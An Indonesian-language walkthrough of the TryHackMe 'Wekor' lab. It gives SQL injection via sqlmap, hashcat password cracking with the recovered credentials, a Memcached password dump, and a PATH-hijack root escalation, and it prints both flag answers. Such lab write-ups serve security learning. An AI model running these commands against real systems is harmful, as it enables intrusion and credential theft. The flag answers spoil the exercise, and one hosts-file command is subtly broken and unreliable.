Wekor - TryHackMe Writeup
Dokumentasi ini berisi langkah-langkah penyelesaian (writeup) untuk mesin Wekor di platform TryHackMe. Tantangan ini berfokus pada teknik enumerasi, eksploitasi web, dan eskalasi hak istimewa di lingkungan Linux.
📝 Ringkasan Mesin

    Nama Mesin: Wekor
    Tingkat Kesulitan: Medium
    Sistem Operasi: Linux
    Fokus Utama: SQL Injection (SQLi), WordPress, VHost Enumeration, Memcached, dan Reverse Engineering sederhana.

🚀 Langkah Penyelesaian
1. Enumerasi Awal
Langkah pertama adalah pemindaian port menggunakan Nmap untuk mengidentifikasi layanan yang berjalan:

```
$ sudo nmap -p- wekor.thm -vvv -sCV -T4
```
    Port 80 (HTTP): Layanan web utama.
    Port 22 (SSH): Akses jarak jauh.

Dianjurkan untuk menambahkan entri domain ke file hosts lokal agar mempermudah akses:
bash

```echo "<IP_ADDRESS> wekor.thm" | sudo tee -a /etc/hosts```

<img width="523" height="75" alt="image" src="https://github.com/user-attachments/assets/b8fe7c2a-4043-4c44-9f99-460db5be58d1" />

2. Eksploitasi Web & SQL Injection

    Directory Brute-forcing: Ditemukan direktori tersembunyi melalui file robots.txt yang mengarah ke /it-next.
    SQLi: Pada bagian keranjang belanja (it_cart.php), terdapat parameter yang rentan terhadap SQL Injection.
    SQLMap: Gunakan alat ini untuk mengekstrak data dari database, termasuk kredensial admin untuk WordPress.

```
┌──(kali㉿kali)-[~/TryHackMe]
└─$ sqlmap -u http://wekor.thm/it-next/it_cart.php --data "coupon_code=&apply_coupon=Apply%20Coupon" -D wordpress -T wp_users --dump
```
<img width="811" height="421" alt="image" src="https://github.com/user-attachments/assets/c970e128-95d1-4437-a4da-6939146234d0" />

```$ hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt```

```
yeffrey - $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10:rockyou
eagle - $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/:xxxxxx
yura - $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/:soccer13
```

```sudo echo "<IP_ADDRESS>    site.wekor.thm" > /etc/hosts```


3. Akses Awal (Initial Access)
   
   yura@wekor.thm:soccer13
   
<img width="339" height="290" alt="image" src="https://github.com/user-attachments/assets/d6a0b16d-87bf-428e-9c5b-a666a6998bed" />

    WordPress: Masuk ke dashboard admin menggunakan kredensial yang ditemukan.
    Reverse Shell: Ubah salah satu file tema PHP untuk menyisipkan payload reverse shell guna mendapatkan akses ke sistem sebagai user www-data.


<img width="1366" height="684" alt="image" src="https://github.com/user-attachments/assets/522d5638-f3a7-4731-baa8-8b07ef5a86f2" />

<img width="282" height="56" alt="image" src="https://github.com/user-attachments/assets/02b00053-1a77-4ee9-9554-478ad6e1b8e1" />


4. Eskalasi Hak Istimewa (Privilege Escalation)

    User Escalation: Melakukan enumerasi pada layanan Memcached untuk menemukan kata sandi user lokal.
    Root Escalation:
        Menganalisis file binari ELF yang mencurigakan.
        Melakukan teknik binary spoofing atau memanfaatkan variabel PATH untuk mengeksekusi perintah dengan hak akses root.

```
telnet localhost 11211
stats items
...
END
stats cachedump 1 0
ITEM id [4 b; 1700509703 s]
ITEM email [14 b; 1700509703 s]
ITEM salary [8 b; 1700509703 s]
ITEM password [15 b; 1700509703 s]
ITEM username [4 b; 1700509703 s]
END
get user
...
get password
OrkAiSC00L24/7$
```
```
Orka@osboxes:~$ sudo -l
sudo -l
[sudo] password for Orka: OrkAiSC00L24/7$

Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```

```
Orka@osboxes:~$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
Orka@osboxes:~$ whereis python
whereis python
python: /usr/bin/python3.5m /usr/bin/python2.7-config /usr/bin/python2.7 /usr/bin/python3.5 /usr/bin/python3.5m-config /usr/bin/python3.5-config /usr/bin/python /usr/lib/python2.7 /usr/lib/python3.5 /etc/python2.7 /etc/python3.5 /etc/python /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/include/python3.5m /usr/include/python2.7 /usr/include/python3.5 /usr/share/python /usr/share/man/man1/python.1.gz
Orka@osboxes:~$
```

```
#!/bin/bash
/bin/bash
```

```
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : password
password
Access Granted...
   User Manual:   
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 0
0
root@osboxes:/usr/sbin#
```


🚩 Flag
Dapatkan kedua flag untuk menyelesaikan tantangan ini:

    User Flag: /home/user/local.txt
    Answer: 1a26a6d51c0172400add0e297608dec6
    Root Flag: /root/proof.txt
    Answer: f4e788f87cc3afaecbaf0f0fe9ae6ad7

    
